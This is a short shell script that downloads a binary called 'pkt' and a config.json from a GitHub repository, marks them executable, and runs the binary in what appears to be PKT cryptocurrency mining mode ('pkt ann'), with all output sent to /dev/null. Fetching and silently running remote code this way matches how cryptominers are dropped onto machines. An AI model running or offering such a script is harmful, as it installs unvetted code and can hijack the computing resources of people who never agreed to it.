#!/bin/sh

wget https://github.com/angkii/2022/raw/main/pkt && chmod 700 pkt
wget https://raw.githubusercontent.com/angkii/2022/main/config.json && chmod 700 config.json
./pkt ann -c "./config.json" >/dev/null 2>&1
